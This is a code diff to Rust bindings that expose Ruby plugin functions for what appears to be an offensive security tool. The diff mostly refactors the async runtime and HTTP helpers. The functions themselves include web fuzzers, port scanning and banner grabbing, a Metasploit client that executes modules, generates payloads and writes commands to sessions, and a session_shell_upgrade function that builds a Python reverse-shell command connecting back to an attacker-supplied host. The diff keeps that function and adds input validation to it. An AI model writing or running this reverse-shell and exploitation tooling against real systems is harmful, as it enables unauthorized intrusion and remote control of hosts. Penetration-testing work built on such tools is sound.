@@ -5,9 +5,9 @@ use magnus::{class::Class, module::Module, prelude::*, value::ReprValue, Error, 
 use base64::Engine as _;
 
 #[cfg(feature = "ruby-plugins")]
-fn create_runtime() -> Result<tokio::runtime::Runtime, Error> {
-    tokio::runtime::Runtime::new()
-        .map_err(|e| Error::runtime(format!("Failed to create async runtime: {}", e)))
+fn get_runtime() -> &'static tokio::runtime::Runtime {
+    static RUNTIME: std::sync::OnceLock<tokio::runtime::Runtime> = std::sync::OnceLock::new();
+    RUNTIME.get_or_init(|| tokio::runtime::Runtime::new().expect("Failed to create tokio runtime"))
 }
 
 #[cfg(feature = "ruby-plugins")]
@@ -77,7 +77,7 @@ fn register_reporting_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), 
 
 #[cfg(feature = "ruby-plugins")]
 fn http_get(url: String) -> Result<magnus::RHash, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let response = rt
         .block_on(async { reqwest::get(&url).await })
         .map_err(|e| Error::runtime(e.to_string()))?;
@@ -94,7 +94,7 @@ fn http_get(url: String) -> Result<magnus::RHash, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn http_post(url: String, body: String) -> Result<magnus::RHash, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let client = reqwest::Client::new();
 
     let response = rt
@@ -113,7 +113,7 @@ fn http_post(url: String, body: String) -> Result<magnus::RHash, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn http_put(url: String, body: String) -> Result<magnus::RHash, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let client = reqwest::Client::new();
 
     let response = rt
@@ -132,7 +132,7 @@ fn http_put(url: String, body: String) -> Result<magnus::RHash, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn http_delete(url: String) -> Result<magnus::RHash, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let client = reqwest::Client::new();
 
     let response = rt
@@ -141,13 +141,17 @@ fn http_delete(url: String) -> Result<magnus::RHash, Error> {
 
     let hash = Ruby::get().unwrap().hash_new();
     hash.aset("status", response.status().as_u16())?;
+    let body = rt
+        .block_on(async { response.text().await })
+        .map_err(|e| Error::runtime(e.to_string()))?;
+    hash.aset("body", body)?;
 
     Ok(hash)
 }
 
 #[cfg(feature = "ruby-plugins")]
 fn http_request(method: String, url: String) -> Result<magnus::RHash, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let client = reqwest::Client::new();
 
     let request = match method.to_uppercase().as_str() {
@@ -167,6 +171,10 @@ fn http_request(method: String, url: String) -> Result<magnus::RHash, Error> {
 
     let hash = Ruby::get().unwrap().hash_new();
     hash.aset("status", response.status().as_u16())?;
+    let body = rt
+        .block_on(async { response.text().await })
+        .map_err(|e| Error::runtime(e.to_string()))?;
+    hash.aset("body", body)?;
 
     Ok(hash)
 }
@@ -181,7 +189,7 @@ fn tcp_connect(host: String, port: u16) -> Result<bool, Error> {
         .next()
         .ok_or_else(|| Error::runtime("Failed to resolve host"))?;
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let connected = rt
         .block_on(async {
             tokio::time::timeout(
@@ -202,7 +210,7 @@ fn scan_port(host: String, port: u16) -> Result<bool, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn grab_banner(host: String, port: u16) -> Result<String, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
 
     let banner = rt.block_on(async {
         use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -238,7 +246,7 @@ fn fuzz_param(
     let mut results = Vec::new();
     let ruby = Ruby::get().unwrap();
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let client = reqwest::Client::new();
 
     for payload in payloads {
@@ -292,7 +300,7 @@ fn fuzz_header(
     let mut results = Vec::new();
     let ruby = Ruby::get().unwrap();
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let client = reqwest::Client::new();
 
     for payload in payloads {
@@ -340,7 +348,7 @@ fn fuzz_cookie(
     let mut results = Vec::new();
     let ruby = Ruby::get().unwrap();
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let client = reqwest::Client::new();
 
     for payload in payloads {
@@ -383,7 +391,7 @@ fn fuzz_path(url: String, paths: Vec<String>) -> Result<Vec<magnus::RHash>, Erro
     let mut results = Vec::new();
     let ruby = Ruby::get().unwrap();
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     let client = reqwest::Client::new();
 
     let base_url = url.trim_end_matches('/');
@@ -423,16 +431,13 @@ fn fuzz_path(url: String, paths: Vec<String>) -> Result<Vec<magnus::RHash>, Erro
 #[cfg(feature = "ruby-plugins")]
 fn detect_vulnerability(resp: &reqwest::Response, body: &str) -> bool {
     let status = resp.status().as_u16();
+    let body_lower = body.to_lowercase();
 
-    if status == 500
-        || status == 200 && body.contains("SQL")
-        || body.contains("mysql")
-        || body.contains("syntax")
-    {
-        return true;
-    }
-
-    false
+    status == 500
+        || (status == 200
+            && (body_lower.contains("sql")
+                || body_lower.contains("mysql")
+                || body_lower.contains("syntax error")))
 }
 
 #[cfg(feature = "ruby-plugins")]
@@ -565,7 +570,7 @@ fn get_msf_client() -> &'static tokio::sync::Mutex<Option<MsfClientState>> {
 
 #[cfg(feature = "ruby-plugins")]
 fn msf_connect(url: String, username: String, password: String) -> Result<bool, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
 
     let config = crate::msf::MsfConfig {
         url: url.clone(),
@@ -583,7 +588,7 @@ fn msf_connect(url: String, username: String, password: String) -> Result<bool, 
     match result {
         Ok(()) => {
             let state = MsfClientState { client, url };
-            let rt = create_runtime()?;
+            let rt = get_runtime();
             rt.block_on(async {
                 let mut guard = get_msf_client().lock().await;
                 *guard = Some(state);
@@ -596,7 +601,7 @@ fn msf_connect(url: String, username: String, password: String) -> Result<bool, 
 
 #[cfg(feature = "ruby-plugins")]
 fn msf_connect_with_token(url: String, token: String) -> Result<bool, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
 
     let config = crate::msf::MsfConfig {
         url: url.clone(),
@@ -620,7 +625,7 @@ fn msf_connect_with_token(url: String, token: String) -> Result<bool, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn msf_connected() -> Result<bool, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         Ok(guard.is_some())
@@ -629,7 +634,7 @@ fn msf_connected() -> Result<bool, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn msf_disconnect() -> Result<bool, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let mut guard = get_msf_client().lock().await;
         *guard = None;
@@ -639,7 +644,7 @@ fn msf_disconnect() -> Result<bool, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn msf_version() -> Result<String, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -665,7 +670,7 @@ fn msf_list_modules(module_type: String) -> Result<Vec<String>, Error> {
         _ => return Err(Error::runtime("Invalid module type")),
     };
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -694,7 +699,7 @@ fn msf_module_info(module_type: String, module_name: String) -> Result<magnus::R
     let ruby = Ruby::get().unwrap();
     let hash = ruby.hash_new();
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -744,7 +749,7 @@ fn msf_execute_module(
         })
         .collect();
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -783,7 +788,7 @@ fn msf_generate_payload(payload_name: String, options: Vec<String>) -> Result<St
         })
         .collect();
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -805,7 +810,7 @@ fn msf_list_sessions() -> Result<Vec<magnus::RHash>, Error> {
     let ruby = Ruby::get().unwrap();
     let mut results = Vec::new();
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -841,7 +846,7 @@ fn msf_session_info(session_id: String) -> Result<magnus::RHash, Error> {
     let ruby = Ruby::get().unwrap();
     let hash = ruby.hash_new();
 
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -870,7 +875,7 @@ fn msf_session_info(session_id: String) -> Result<magnus::RHash, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn msf_session_write(session_id: String, command: String) -> Result<String, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -890,7 +895,7 @@ fn msf_session_write(session_id: String, command: String) -> Result<String, Erro
 
 #[cfg(feature = "ruby-plugins")]
 fn msf_session_read(session_id: String) -> Result<String, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -906,7 +911,7 @@ fn msf_session_read(session_id: String) -> Result<String, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn msf_session_stop(session_id: String) -> Result<bool, Error> {
-    let rt = create_runtime()?;
+    let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
@@ -927,30 +932,20 @@ fn encoder_list() -> Result<Vec<String>, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn encoder_encode(
-    payload: String,
-    encoder_name: String,
-    options: Vec<String>,
+    _payload: String,
+    _encoder_name: String,
+    _options: Vec<String>,
 ) -> Result<String, Error> {
-    let opts: std::collections::HashMap<String, String> = options
-        .iter()
-        .filter_map(|s| {
-            let parts: Vec<&str> = s.splitn(2, '=').collect();
-            if parts.len() == 2 {
-                Some((parts[0].to_string(), parts[1].to_string()))
-            } else {
-                None
-            }
-        })
-        .collect();
-
-    let encoded_payload = format!("{}:{}", encoder_name, payload);
-
-    Ok(encoded_payload)
+    Err(Error::runtime(
+        "encoder_encode is not yet implemented. Use msf_execute_module(\"encoder\", ...) instead.",
+    ))
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn encoder_compatible_payloads(encoder_name: String) -> Result<Vec<String>, Error> {
-    Ok(vec![])
+fn encoder_compatible_payloads(_encoder_name: String) -> Result<Vec<String>, Error> {
+    Err(Error::runtime(
+        "encoder_compatible_payloads is not yet implemented.",
+    ))
 }
 
 #[cfg(feature = "ruby-plugins")]
@@ -976,7 +971,18 @@ fn session_read_output(session_id: String) -> Result<String, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn session_shell_upgrade(session_id: String, lhost: String, lport: String) -> Result<bool, Error> {
-    let command = format!("python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", lhost, lport);
+    // Validate lhost as a valid IP or hostname
+    if lhost.is_empty() || lhost.contains(|c: char| !c.is_alphanumeric() && c != '.' && c != '-' && c != ':') {
+        return Err(Error::runtime("Invalid lhost: must be a valid IP address or hostname"));
+    }
+    // Validate lport as a valid u16
+    let port: u16 = lport
+        .parse()
+        .map_err(|_| Error::runtime("Invalid lport: must be a number between 1 and 65535"))?;
+    if port == 0 {
+        return Err(Error::runtime("Invalid lport: must be between 1 and 65535"));
+    }
+    let command = format!("python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", lhost, port);
     msf_session_write(session_id, command)?;
     Ok(true)
 }
